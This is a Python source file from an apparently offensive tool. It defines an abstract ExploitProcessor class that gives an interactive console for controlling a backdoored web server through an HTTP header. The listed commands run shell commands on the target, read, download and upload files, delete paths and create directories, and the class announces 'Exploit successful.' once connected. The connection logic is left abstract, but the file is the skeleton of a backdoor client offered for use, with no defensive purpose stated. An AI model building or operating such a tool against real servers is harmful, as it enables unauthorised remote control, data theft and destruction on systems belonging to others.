import os  # lrun
from abc import ABC, abstractmethod  # abstract methods and inheritance
from Exceptions import *
from CommandProcessor import CommandProcessor

"""
@brief The ExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored server.
        Inherits from the CommandProcessor class. 
"""
class ExploitProcessor(CommandProcessor, ABC):
    """
    @brief Construct an ExploitProcessor.
    @param host the hostname of the backdoored server.
    @param path the path of the backdoored resource.
    @param method the HTTP method to access the backdoor with.
    @param header the HTTP header containing the backdoor.
    @pre \p host is a valid backdoored host.
    @pre \p path is the path to a valid backdoored resource.
    @pre \p method is allowed by the target.
    @pre \p header corresponds to the server side backdoor.
    @throw CommandException if the connection fails.
    """
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__()
        self.commands["--version"] = {
            "method": self._Base__version,
            "description": "Get the version of PHP running."
        }

        self.commands["pwd"] = {
            "method": self._Base__pwd,
            "description": "Print working directory."
        }

        self.commands["ls"] = {
            "method": self._Base__ls,
            "description": "List files and directories."
        }

        self.commands["run"] = {
            "method": self._Base__run,
            "description": (f"Run a command on the target machine.\n"
                            f"        Usage: run ...")
        }

        self.commands["lrun"] = {
            "method": self._Base__lrun,
            "description": (f"Run a command on the local machine.\n"
                            f"        Usage: lrun ...")
        }

        self.commands["cd"] = {
            "method": self._Base__cd,
            "description": (f"Change directory.\n"
                            f"        Usage: cd directory")
        }

        self.commands["cat"] = {
            "method": self._Base__cat,
            "description": (f"Print contents of a file.\n"
                            f"        Usage: cat file")
        }
        
        self.commands["download"] = {
            "method": self._Base__download,
            "description": (f"Download a file to your local machine\n"
                            f"        Usage: download file")
        }

        self.commands["upload"] = {
            "method": self._Base__upload,
            "description": (f"Upload a file to the target machine\n"
                            f"        Usage: upload local_file\n"
                            f"            local_file is a file relative to "
                            f"the location the script is ran.")
        }

        self.commands["rm"] = {
            "method": self._Base__rm,
            "description": (f"Remove a file or directory on the target "
                            f"machine.\n"
                            f"        Usage: rm path\n"
                            f"            path is the path to the file or "
                            f"directory.")
        }

        self.commands["mkdir"] = {
            "method": self._Base__mkdir,
            "description": (f"Create a directory on the target machine given "
                            f"the path. Will be performed recursively.\n"
                            f"        Usage: mkdir path\n"
                            f"            path is the path to the directory.")
        }

        self.host = host
        self.path = path
        self.method = method
        self.header = header
        self.directory = self._Base__make_connection()
        self.name = None
        print("Exploit successful.")
        print("You can now run exploit commands.")
        print("For help, run 'help'")

    """
    @brief Getter for the name of this ExploitProcessor.
    @return the name of the ExploitProcessor.
    """
    @abstractmethod
    def get_name(self):
        pass

    """
    @brief Abstract method to start a connection with the backdoored resource.
    @throw CommandException if the connection fails.
    """
    @abstractmethod
    def _Base__make_connection(self):
        pass
    
    """
    @brief Abstract method to start a connection with the backdoored resource.
    @param message the message to be sent to the backdoor.
    @pre \p message is proper and can be evaluated and will make the server
            respond with an HTTP header as defined by your exploit header.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__send_message(self, message: str):
        pass

    """
    @brief Abstract method to get the version of the backend software in the
            backdoored server.
    @param options Not used.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__version(self, options: str):
        pass

    """
    @brief Abstract method to print the current working directory.
    @param options Not used.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__pwd(self, options: str):
        pass

    """
    @brief Abstract method to print the directories and files in the current
            working directory.
    @param options Not used.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__ls(self, options: str):
        pass

    """
    @brief Abstract method to run a command on the target machine and print its
            output. If you run a command that needs an interactive shell,
            there's a good chance that it will cause the connection to hang,
            which could cause denial-of-service, so be careful.
    @param options the command to be run on the server.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__run(self, options: str):
        pass

    """
    @brief Abstract method to run a command on the local machine and print its
            output.
    @param options the command to be run locally.
    """
    def _Base__lrun(self, options: str):
        out = os.popen(options).read()
        print(out, end='')

    """
    @brief Abstract method to change working directory.
    @param options the directory to change to.
    """
    @abstractmethod
    def _Base__cd(self, options: str):
        pass

    """
    @brief Abstract method to print the contents of a file.
    @param options the file to print.
    """
    @abstractmethod
    def _Base__cat(self, options: str):
        pass

    """
    @brief Abstract method to download a file from the server.
    @param options the file to download.
    """
    @abstractmethod
    def _Base__download(self, options: str):
        pass

    """
    @brief Abstract method to upload a file to the server.
    @param options the file to upload.
    """
    @abstractmethod
    def _Base__upload(self, options: str):
        pass

    """
    @brief Abstract method to delete a file or directory on the server.
    @param the file or directory to delete.
    """
    @abstractmethod
    def _Base__rm(self, options: str):
        pass

    """
    @brief Abstract method to recursively create a directory.
    @param the directory name.
    """
    @abstractmethod
    def _Base__mkdir(self, options: str):
        pass
